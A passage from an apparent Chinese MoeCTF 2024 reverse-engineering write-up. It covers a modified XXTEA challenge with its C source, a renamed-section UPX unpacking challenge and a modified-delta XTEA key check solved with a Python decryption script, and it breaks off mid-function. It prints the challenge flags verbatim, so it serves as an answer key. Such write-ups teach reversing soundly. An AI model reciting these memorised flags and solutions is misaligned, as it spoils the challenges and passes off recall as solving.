&amp; <span class="number">3</span>))) + (v4 ^ v9)) ^ (((<span class="number">16</span> * v6) ^ (v4 &gt;&gt; <span class="number">3</span>))</span><br><span class="line">                                                                           + ((<span class="number">4</span> * v4) ^ (v6 &gt;&gt; <span class="number">5</span>))))</span><br><span class="line">            + a1[j];</span><br><span class="line">        a1[j] = v17;</span><br><span class="line">        v6 = v17;</span><br><span class="line">      &#125;</span><br><span class="line">      v18 = (((v6 ^ *(_DWORD *)(a3 + <span class="number">4LL</span> * (v15 ^ j &amp; <span class="number">3</span>))) + (*a1 ^ v9)) ^ (((<span class="number">16</span> * v6) ^ ((<span class="type">unsigned</span> <span class="type">int</span>)*a1 &gt;&gt; <span class="number">3</span>))</span><br><span class="line">                                                                          + ((<span class="number">4</span> * *a1) ^ (v6 &gt;&gt; <span class="number">5</span>))))</span><br><span class="line">          + a1[v22 - <span class="number">1</span>];</span><br><span class="line">      a1[v22 - <span class="number">1</span>] = v18;</span><br><span class="line">      v6 = v18;</span><br><span class="line">      result = (<span class="type">unsigned</span> <span class="type">int</span>)--v13;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v13 );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这其实是一个标准的XXTEA，当n&gt;1的时候（也就是+12）的时候，是加密，-12就是解密。<br>所以这个程序其实在做一个事情：把内置的flag进行解密后又马上加密回去，所以我们只需要动态调试，找到解密后的flag即可。<br>最后我们附上这个题目的c语言源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z&gt;&gt;5^y<span class="string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x114514</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">ppp</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">int</span> n, <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">        <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">        <span class="keyword">if</span> (n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span></span><br><span class="line">        &#123;</span><br><span class="line">                rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">                sum = <span class="number">0</span>;</span><br><span class="line">                z = v[n - <span class="number">1</span>];</span><br><span class="line">                <span class="keyword">do</span></span><br><span class="line">                &#123;</span><br><span class="line">                        sum += DELTA;</span><br><span class="line">                        e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">                        <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++)</span><br><span class="line">                        &#123;</span><br><span class="line">                                y = v[p + <span class="number">1</span>];</span><br><span class="line">                                z = v[p] += MX;</span><br><span class="line">                        &#125;</span><br><span class="line">                        y = v[<span class="number">0</span>];</span><br><span class="line">                        z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line">                &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span></span><br><span class="line">        &#123;</span><br><span class="line">                n = -n;</span><br><span class="line">                rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">                sum = rounds * DELTA;</span><br><span class="line">                y = v[<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">do</span></span><br><span class="line">                &#123;</span><br><span class="line">                        e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">                        <span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--)</span><br><span class="line">                        &#123;</span><br><span class="line">                                z = v[p - <span class="number">1</span>];</span><br><span class="line">                                y = v[p] -= MX;</span><br><span class="line">                        &#125;</span><br><span class="line">                        z = v[n - <span class="number">1</span>];</span><br><span class="line">                        y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">                        sum -= DELTA;</span><br><span class="line">                &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">char</span> v[] = &#123; <span class="number">0xa2</span>,<span class="number">0x05</span>,<span class="number">0x69</span>,<span class="number">0x8b</span>,<span class="number">0xda</span>,<span class="number">0x17</span>,<span class="number">0x05</span>,<span class="number">0xe1</span>,<span class="number">0xdc</span>,<span class="number">0xcc</span>,<span class="number">0xcc</span>,<span class="number">0xc1</span>,<span class="number">0x64</span>,<span class="number">0x74</span>,<span class="number">0xfa</span>,<span class="number">0x50</span>,<span class="number">0xd5</span>,<span class="number">0xa1</span>,<span class="number">0x9a</span>,<span class="number">0xac</span>,<span class="number">0xdc</span>,<span class="number">0xde</span>,<span class="number">0x64</span>,<span class="number">0xbf</span>,<span class="number">0x94</span>,<span class="number">0x2d</span>,<span class="number">0x23</span>,<span class="number">0xf3</span>,<span class="number">0x01</span>,<span class="number">0xd5</span>,<span class="number">0x62</span>,<span class="number">0xc8</span>,<span class="number">0xea</span>,<span class="number">0xad</span>,<span class="number">0xd2</span>,<span class="number">0xd6</span>,<span class="number">0x2a</span>,<span class="number">0x50</span>,<span class="number">0x5e</span>,<span class="number">0x6b</span>,<span class="number">0x73</span>,<span class="number">0x0c</span>,<span class="number">0xfd</span>,<span class="number">0x8c</span>,<span class="number">0x3d</span>,<span class="number">0x38</span>,<span class="number">0x3d</span>,<span class="number">0xd1</span> &#125;;</span><br><span class="line">        <span class="type">uint32_t</span> k[] = &#123; <span class="number">0xcafebabe</span> , <span class="number">0xdeadc0de</span>, <span class="number">0xd3906</span>, <span class="number">0x114514</span> &#125;;</span><br><span class="line">        ppp((<span class="type">uint32_t</span>*)v, <span class="number">-12</span>, k);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;What happened to my Flag?&quot;</span>);</span><br><span class="line">        ppp((<span class="type">uint32_t</span>*)v, <span class="number">12</span>, k);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Your Flag has encrypted.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>moectf&#123;18d4c944-947c-4808-9536-c7d34d6b3827&#125;</code></p><h1 id="Reverse-问卷-Bye-MoeCTF2024"><a href="#Reverse-问卷-Bye-MoeCTF2024" class="headerlink" title="Reverse 问卷: Bye, MoeCTF2024"></a>Reverse 问卷: Bye, MoeCTF2024</h1><p>填写问卷即可获得flag。<br><code>moectf&#123;Thank_You_FOR_Playing_Reverse_Challenges&#125;</code></p><h1 id="upx-revenge"><a href="#upx-revenge" class="headerlink" title="upx-revenge"></a>upx-revenge</h1><p>解法1：这个程序直接upx -d是显示无法进行解压的，原因是UPX解压的时候会检测程序段名称是否为UPX0\UPX1这类的，但是我改成了vmp0，导致无法直接解压，我们使用010Editor打开后更改这个字符串也就可以解密了。<br>解法2：直接拖入X64dbg进行动态调试，调试起来后直接搜索全局字符串，就可以找到flag。<br>解法3：CheatEngine进行字符串搜索。<br><code>moectf&#123;554ea35c-a1bb-4d8f-a323-bd697564bf27&#125;</code></p><h1 id="XTEA"><a href="#XTEA" class="headerlink" title="XTEA"></a>XTEA</h1><p>我们拿到文件后拖入IDA，可以获得以下代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax</span></span><br><span class="line">  __int64 v10; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v11; <span class="comment">// [rsp+20h] [rbp+0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v12; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="type">char</span> Str[<span class="number">48</span>]; <span class="comment">// [rsp+48h] [rbp+28h] BYREF</span></span><br><span class="line">  _DWORD v14[<span class="number">12</span>]; <span class="comment">// [rsp+78h] [rbp+58h] BYREF</span></span><br><span class="line">  _BYTE Src[<span class="number">32</span>]; <span class="comment">// [rsp+A8h] [rbp+88h] BYREF</span></span><br><span class="line">  _BYTE v16[<span class="number">28</span>]; <span class="comment">// [rsp+C8h] [rbp+A8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+E4h] [rbp+C4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = &amp;v11;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">58LL</span>; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v3 = <span class="number">-858993460</span>;</span><br><span class="line">    v3 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">j___CheckForDebuggerJustMyCode</span>(&amp;unk_140028066, argv, envp);</span><br><span class="line">  v12 = <span class="number">32</span>;</span><br><span class="line">  <span class="built_in">memset</span>(Str, <span class="number">0</span>, <span class="number">0xD</span>uLL);</span><br><span class="line">  v5 = <span class="built_in">sub_1400110AA</span>(std::cout, <span class="string">&quot;please input key:&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v5, sub_140011046);</span><br><span class="line">  <span class="built_in">sub_14001153C</span>(std::cin, Str);</span><br><span class="line">  v14[<span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line">  v14[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v14[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">  v14[<span class="number">3</span>] = <span class="number">4</span>;</span><br><span class="line">  v6 = <span class="built_in">sub_1400110AA</span>(std::cout, <span class="string">&quot;let me check your key&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v6, sub_140011046);</span><br><span class="line">  v7 = <span class="built_in">sub_1400110AA</span>(std::cout, <span class="string">&quot;emmm&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v7, sub_140011046);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">j_strlen</span>(Str) == <span class="number">12</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(v16, <span class="number">0</span>, <span class="number">8uLL</span>);</span><br><span class="line">    <span class="built_in">j_memcpy</span>(Src, Str, <span class="number">8uLL</span>);</span><br><span class="line">    <span class="built_in">sub_14001119F</span>(v12, Src, v14);</span><br><span class="line">    <span class="built_in">j_memcpy</span>(Str, Src, <span class="number">8uLL</span>);</span><br><span class="line">    <span class="built_in">j_memcpy</span>(v16, &amp;Str[<span class="number">4</span>], <span class="number">8uLL</span>);</span><br><span class="line">    <span class="built_in">sub_14001119F</span>(v12, v16, v14);</span><br><span class="line">    <span class="built_in">j_memcpy</span>(&amp;Str[<span class="number">4</span>], v16, <span class="number">8uLL</span>);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">12</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( Str[j] != byte_140022000[j] )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">    &#125;</span><br><span class="line">    v10 = <span class="built_in">sub_1400110AA</span>(std::cout, <span class="string">&quot;Correct key! Your flag is moectf&#123;your key&#125;&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v10, sub_140011046);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">LABEL_5:</span><br><span class="line">    v8 = <span class="built_in">sub_1400110AA</span>(std::cout, <span class="string">&quot;XD,wrong!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v8, sub_140011046);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以观察到，<code>sub_14001119F</code>为加密函数，因为在memcpy之后进行的它，并且它的结果又覆盖回去了，最后与正确的结果进行对比。<br>以下是XTEA的加密</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1400148C0</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1, <span class="type">unsigned</span> <span class="type">int</span> *a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [rsp+64h] [rbp+44h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [rsp+84h] [rbp+64h]</span></span><br><span class="line"></span><br><span class="line">  j___CheckForDebuggerJustMyCode(&amp;unk_140028066, a2, a3);</span><br><span class="line">  v5 = *a2;</span><br><span class="line">  v6 = a2[<span class="number">1</span>];</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a1; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 += (*(_DWORD *)(a3 + <span class="number">4LL</span> * (v7 &amp; <span class="number">3</span>)) + v7) ^ (v6 + ((v6 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v6)));</span><br><span class="line">    v7 -= <span class="number">855655493</span>;</span><br><span class="line">    v6 += (*(_DWORD *)(a3 + <span class="number">4LL</span> * ((v7 &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>)) + v7) ^ (v5 + ((v5 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v5)));</span><br><span class="line">  &#125;</span><br><span class="line">  *a2 = v5;</span><br><span class="line">  result = <span class="number">4LL</span>;</span><br><span class="line">  a2[<span class="number">1</span>] = v6;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以观察到IDA存在一些反编译错误，比如a3是一个DWORD型的指针（在main函数中，这个数组被赋值为了2 0 2 4）。我们进行修改，并且我们发现第一个参数是rounds(循环次数)，第二个参数是Source，修改后的结果如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1400148C0</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> rounds, <span class="type">unsigned</span> <span class="type">int</span> *source, _DWORD *key)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [rsp+64h] [rbp+44h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [rsp+84h] [rbp+64h]</span></span><br><span class="line"></span><br><span class="line">  j___CheckForDebuggerJustMyCode(&amp;unk_140028066, source, key);</span><br><span class="line">  v5 = *source;</span><br><span class="line">  v6 = source[<span class="number">1</span>];</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; rounds; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 += (key[v7 &amp; <span class="number">3</span>] + v7) ^ (v6 + ((v6 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v6)));</span><br><span class="line">    v7 -= <span class="number">855655493</span>;</span><br><span class="line">    v6 += (key[(v7 &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + v7) ^ (v5 + ((v5 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v5)));</span><br><span class="line">  &#125;</span><br><span class="line">  *source = v5;</span><br><span class="line">  result = <span class="number">4LL</span>;</span><br><span class="line">  source[<span class="number">1</span>] = v6;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是，我们可以观察到这是一个魔改了Delta的XTEA。<br>我们再返回main函数进行观察</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( j_strlen(Str) == <span class="number">12</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memset</span>(v16, <span class="number">0</span>, <span class="number">8uLL</span>);</span><br><span class="line">  j_memcpy(Src, Str, <span class="number">8uLL</span>);</span><br><span class="line">  xtea_encrypt(len, (__int64)Src, (__int64)key);</span><br><span class="line">  j_memcpy(Str, Src, <span class="number">8uLL</span>);</span><br><span class="line">  j_memcpy(v16, &amp;Str[<span class="number">4</span>], <span class="number">8uLL</span>);</span><br><span class="line">  xtea_encrypt(len, (__int64)v16, (__int64)key);</span><br><span class="line">  j_memcpy(&amp;Str[<span class="number">4</span>], v16, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">12</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( Str[j] != byte_140022000[j] )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  &#125;</span><br><span class="line">  v10 = sub_1400110AA(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Correct key! Your flag is moectf&#123;your key&#125;&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v10, sub_140011046);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以注意到，输入的数据是12字节，也就是flag长度是12字节，首先Str（输入的字符）前8个字节先拷贝到了Src里面，然后Src进行加密，加密了前8个字节（因为Xtea只加密8个字节），然后，memcpy把加密的8个字节再覆盖回Str里面，接下来，Memcpy对str+4拷贝（拷贝后8个字节）到v16中，然后对v16进行加密，所以上面的流程可以等效为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xtea_encrypt(len, (__int64)Src, (__int64)key);</span><br><span class="line">xtea_encrypt(len, (__int64)(Src + <span class="number">4</span>), (__int64)key);</span><br></pre></td></tr></table></figure><p>最后和标准结果进行对比。<br>我们写出最后的EXP *(由于Regadgets库暂时不公开，所以我只放出了部分使用到的函数的源码。)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="number">0xA3</span>, <span class="number">0x69</span>, <span class="number">0x96</span>, <span class="number">0x26</span>, <span class="number">0xBD</span>, <span class="number">0x78</span>, <span class="number">0x0B</span>, <span class="number">0x3D</span>, <span class="number">0x9D</span>, <span class="number">0xA5</span>, <span class="number">0x28</span>, <span class="number">0x62</span>]</span><br><span class="line">key = [<span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拆分成3个DWORD</span></span><br><span class="line">dw1, dw2, dw3 = byte2dword(enc)</span><br><span class="line"></span><br><span class="line">dw2, dw3 = xtea_decrypt((dw2, dw3), key=key, delta=-<span class="number">0x33004445</span>, rounds=<span class="number">32</span>)</span><br><span class="line">dw1, dw2 = xtea_decrypt((dw1, dw2), key=key, delta=-<span class="number">0x33004445</span>, rounds=<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(dword2byte([dw1, dw2, dw3]))</span><br><span class="line"><span class="comment"># b&#x27;moectf2024!!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">from regadgets import *</span></span><br><span class="line"><span class="string">Internal Functions Of Regadgets</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span>, <span class="type">Tuple</span></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> c_uint32</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">byte2dword</span>(<span class="params">x: <span class="type">List</span>[<span class="built_in">int</span>]</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(x) % <span class="number">4</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(x) == <span class="built_in">bytes</span>:</span><br><span class="line">            x += <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">4</span> - (<span class="built_in">len</span>(x) % <span class="number">4</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x += [<span class="number">0</span>] * (<span class="number">4</span> - (<span class="built_in">len</span>(x) % <span class="number">4</span>))</span><br><span class="line">    <span class="keyword">return</span> [v[<span class="number">0</span>] <span class="keyword">for</span> v <span class="keyword">in</span> (unpack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="built_in">bytes</span>(x[i:i+<span class="number">4</span>])) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(x), <span class="number">4</span>))]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xtea_decrypt</span>(<span class="params"></span></span><br><span class="line"><span class="params">    src: <span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>], key: <span class="type">List</span>[<span class="built_in">int</span>], delta: <span class="built_in">int</span> = <span class="number">0x9E3779B9</span>, rounds: <span class="built_in">int</span> = <span class="number">32</span></span></span><br><span class="line"><span class="params"></span>):</span><br><span class="line">    l, r = c_uint32(src[<span class="number">0</span>]), c_uint32(src[<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">sum</span> = c_uint32(delta * rounds)</span><br><span class="line">    k = [c_uint32(key[<span class="number">0</span>]), c_uint32(key[<span class="number">1</span>]), c_uint32(key[<span class="number">2</span>]), c_uint32(key[<span class="number">3</span>])]</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        r.value -= (((l.value &lt;&lt; <span class="number">4</span>) ^ (l.value &gt;&gt; <span class="number">5</span>)) + l.value) ^ (</span><br><span class="line">            <span class="built_in">sum</span>.value + k[(<span class="built_in">sum</span>.value &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>].value</span><br><span class="line">        )</span><br><span class="line">        <span class="built_in">sum</span>.value -= delta</span><br><span class="line">        l.value -= (((r.value &lt;&lt; <span class="number">4</span>) ^ (r.value &gt;&gt; <span class="number">5</span>)) + r.value) ^ (</span><br><span class="line">            